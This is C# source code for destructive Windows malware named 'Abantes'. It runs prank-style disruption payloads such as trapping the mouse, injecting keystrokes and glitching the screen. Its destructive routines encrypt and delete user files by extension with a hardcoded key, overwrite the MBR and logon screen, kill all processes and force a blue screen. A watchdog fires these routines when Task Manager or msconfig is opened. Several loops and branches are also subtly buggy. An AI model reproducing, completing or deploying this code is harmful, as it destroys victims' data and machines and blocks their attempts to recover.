using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using Abantes.Utils;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Media;
using Microsoft.Win32;

namespace Abantes.Payloads
{
    class Threads
    {
        static Random _random = new Random();
        public static void MainPayloadThread()
        {
            Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
            while (true)
            {
                switch (_random.Next(12))
                {
                    case 0:
                        Thread randomOSsound = new Thread(new ThreadStart(Annoying.RandomOSSounds));
                        randomOSsound.Start();
                        break;
                    case 1:
                        Thread randomKeyboard = new Thread(new ThreadStart(Annoying.RandomKeyboard));
                        randomKeyboard.Start();
                        break;
                    case 2:
                        if (_random.Next(100) > 50)
                        {
                            cursoricon.Start();
                        }
                        else
                        {
                            Annoying.ChangeWindowText();
                        }
                        break;
                    case 3:
                        cursoricon.Start();
                        break;
                    case 4:
                        if (_random.Next(100) > 50)
                        {
                            Thread mouseTrap = new Thread(new ThreadStart(Annoying.MouseTrap));
                            mouseTrap.Start();
                        }
                        else
                        {
                            Annoying.ChangeWindowText();
                        }
                        break;
                    case 5:
                        Annoying.ChangeWindowText();
                        break;
                    case 6:
                        Annoying.EjectCd();
                        break;
                    case 7:
                        Thread screenscrew = new Thread(new ThreadStart(Annoying.Screen_Screw));
                        screenscrew.Start();
                        break;
                    case 8:
                        Thread screenglitch = new Thread(new ThreadStart(Annoying.Screen_Glitching));
                        screenglitch.Start();
                        break;
                    case 9:
                        Thread helpicons = new Thread(new ThreadStart(Annoying.Display_Icons_Error));
                        helpicons.Start();
                        break;
                    case 10:
                        Thread crazybounce = new Thread(new ThreadStart(Annoying.CrazyBounce));
                        crazybounce.Start();
                        break;
                    case 11:
                        Thread flip = new Thread(new ThreadStart(Annoying.Flip));
                        flip.Start();
                        break;
                    case 12:
                        Thread text = new Thread(new ThreadStart(Annoying.Text));
                        text.Start();
                        break;
                }
                Thread.Sleep(8000);
            }
        }
        public static void WatchDogThread()
        {
            string[] NeverRun = { "msconfig", "taskmgr" };
            string[] MustRun = { "Rules" };
            while (true)
            {
                WatchDog.ProcessWatchDog(MustRun, NeverRun);
            }
        }
    }
    class Annoying
    {
        [DllImport("user32.dll")]
        static extern int SetWindowText(IntPtr hWnd, string text);
        public static void ChangeWindowText()
        {
            Process[] allProcesses = Process.GetProcesses();
            for (int i = 0; i < allProcesses.Length; i++)
            {
                SetWindowText(allProcesses[i].MainWindowHandle, "You're Screwed");
            }
        }
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Screen_Screw@Payloads@1@QAEXXZ")]
        public static extern void Screen_Screw();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Screen_Glitching@Payloads@1@QAEXXZ")]
        public static extern void Screen_Glitching();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?EjectCD@Payloads@1@QAEXXZ")]
        public static extern void EjectCd();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Display_Icons_Error@Payloads@1@QAEXXZ")]
        public static extern void Display_Icons_Error();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?CursorIcon@Payloads@1@QAEXXZ")]
        public static extern void CursorIcon();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?CrazyBounce@Payloads@1@QAEXXZ")]
        public static extern void CrazyBounce();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Text@Payloads@1@QAEXXZ")]
        public static extern void Text();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?Flip@Payloads@1@QAEXXZ")]
        public static extern void Flip();
        static Point Position;
        static Random _random = new Random();
        public static void MouseTrap()
        {
            Position.X = 500;
            Position.Y = 500;
            while (true)
            {
                Cursor.Position = Position;
            }
        }
        public static void RandomKeyboard()
        {
            while (true)
            {
                if (_random.Next(100) > 95)
                {
                    char key = (char)(_random.Next(25) + 65);
                    if (_random.Next(2) == 0)
                    {
                        key = Char.ToLower(key);
                    }
                    SendKeys.SendWait(key.ToString());
                }
                Thread.Sleep(400);
            }
        }
        public static void RandomOSSounds()
        {
            while (true)
            {
                if (_random.Next(100) > 80)
                {
                    switch (_random.Next(5))
                    {
                        case 0:
                            SystemSounds.Asterisk.Play();
                            break;
                        case 1:
                            SystemSounds.Beep.Play();
                            break;
                        case 2:
                            SystemSounds.Exclamation.Play();
                            break;
                        case 3:
                            SystemSounds.Hand.Play();
                            break;
                        case 4:
                            SystemSounds.Question.Play();
                            break;
                    }
                }
                Thread.Sleep(400);
            }
        }
        public static void LockedImage()
        {
            Form Image = new LockedImage();
            Image.Show();
        }
    }
    class Destructive
    {
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?MBR_Overwrite@Payloads@1@QAEXXZ")]
        public static extern void MBR_Overwrite();
        [DllImport(@"C:\Windows\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?FORCE_BSOD@Payloads@1@QAEXXZ")]
        public static extern void FORCE_BSOD();
        public static void LogonUIOverwrite()
        {
            string extractPath = @"C:\Windows\Defender";
            Process ScriptProcess = new Process();
            ScriptProcess.StartInfo.CreateNoWindow = false;
            ScriptProcess.StartInfo.FileName = extractPath + @"\logonOverwrite.bat"; 
            ScriptProcess.Start();
        }
        public static void EncryptUserFiles()
        {
            List<string> pathsToEncrypt = new List<string>();
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
            pathsToEncrypt.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            foreach (string currentPath in pathsToEncrypt)
            {
                GetFilesAndEncrypt(currentPath);
            }
        }
        static void GetFilesAndEncrypt(string Ps)
        {
            try
            {
                var validExtensions = new[]
                {
                    ".jpg", ".jpeg", ".raw", ".tif", ".gif", ".png", ".bmp", ".3dm", ".max", ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", ".dwg", ".dxf",
                    ".c", ".cpp", ".cs", ".h", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".py", ".js", ".rar", ".zip", ".7zip", ".7z", ".dat", ".csv",
                    ".efx", ".sdf", ".vcf", ".xml", ".ses", ".aaf", ".aep", ".aepx", ".plb", ".prel", ".prproj", ".aet", ".ppj", ".psd", ".indd", ".indl", ".indt",
                    ".indb", ".inx", ".idml", ".pmd", ".xqx", ".xqx", ".ai", ".eps", ".ps", ".svg", ".swf", ".fla", ".as3", ".as", ".txt", ".doc", ".dot", ".docx",
                    ".docm", ".dotx", ".dotm", ".docb", ".rtf", ".wpd", ".wps", ".msg", ".pdf", ".xls", ".xlt", ".xlm", ".xlsx", ".xlsm", ".xltx", ".xltm", ".xlsb",
                    ".xla", ".xlam", ".xll", ".xlw", ".ppt", ".pot", ".pps", ".pptx", ".pptm", ".potx", ".potm", ".ppam", ".ppsx", ".ppsm", ".sldx", ".sldm",".wav",
                    ".mp3", ".aif", ".iff", ".m3u", ".m4u", ".mid", ".mpa", ".wma", ".ra", ".avi", ".mov", ".mp4", ".3gp", ".mpeg", ".3g2", ".asf", ".asx", ".flv",
                    ".mpg", ".wmv", ".vob", ".m3u8", ".mkv", ".m4a", ".ico", ".dic", ".rex", ".hmg", ".config", ".resx", ".res"
                };
                string[] files = Directory.GetFiles(Ps);
                foreach (string currentFile in files)
                {
                    string extension = Path.GetExtension(currentFile);
                    if (validExtensions.Contains(extension))
                    {
                        Encryption.FileEncrypt(currentFile, "WR8h2GIbf9FGz6VVlSzJ");
                        File.Delete(currentFile);
                    }
                }
                string[] subDirs = Directory.GetDirectories(Ps);
                foreach (string currentPath in subDirs)
                {
                    GetFilesAndEncrypt(currentPath);
                }
            }
            catch { }
        }
        public static void KillAll()
        {
            //This is here incase C++ NTRAISEHARDERROR doesn't work, it runs first so could still indefinitely cause a BSOD

            Process[] allProcesses = Process.GetProcesses();

            for (int i = 0; i < allProcesses.Length; i++)
            {
                try
                {
                    allProcesses[i].Kill();
                } catch { }
            }
        }
        public static void KillPC()
        {
            EncryptUserFiles();
            LogonUIOverwrite();
            MBR_Overwrite();
            KillAll();
            FORCE_BSOD();
        }
    }
    class WatchDog
    {
        public static void FileWatchDog(string[] sFileName)
        {
            //Put each files path in an array to check if it exists

            for (int i = 0; i > sFileName.Count();i++)
            {
                if (File.Exists(sFileName[i]) == false)
                {
                    Destructive.KillPC();
                }
            }
        }
        public static void ProcessWatchDog(string[] sMustRun, string[] sNeverRun)
        {
            //Put each process to watch for in an array to check if it exists
            
            for (int i = 0; i < sMustRun.Count(); i++)
            {
                
                Process[] proc = Process.GetProcessesByName(sMustRun[i]);
                if (proc.Length > 0)
                {
                    
                    if (proc[0].ToString() == Process.GetProcessesByName("taskmgr")[0].ToString())
                    {
                        //Flagged
                        SpeechSynthesizer TTS = new SpeechSynthesizer();
                        TTS.SetOutputToDefaultAudioDevice();
                        TTS.Volume = 100;
                        TTS.Speak("There Is No Way Out");
                    }
                    else if (proc[0].ToString() == Process.GetProcessesByName("msconfig")[0].ToString())
                    {
                        //Flagged
                        Destructive.KillPC();
                    }
                    else
                    {
                        //Non-Flagged Process found
                    }
                }
            }

            for (int i = 0; i < sNeverRun.Count(); i++)
            {
                Process[] proc = Process.GetProcessesByName(sMustRun[i]);
                if (proc.Length == 0)
                {
                    //Running
                }
                else
                {
                    //Not Running
                    Destructive.KillPC();
                }
            }
        }

    }
}
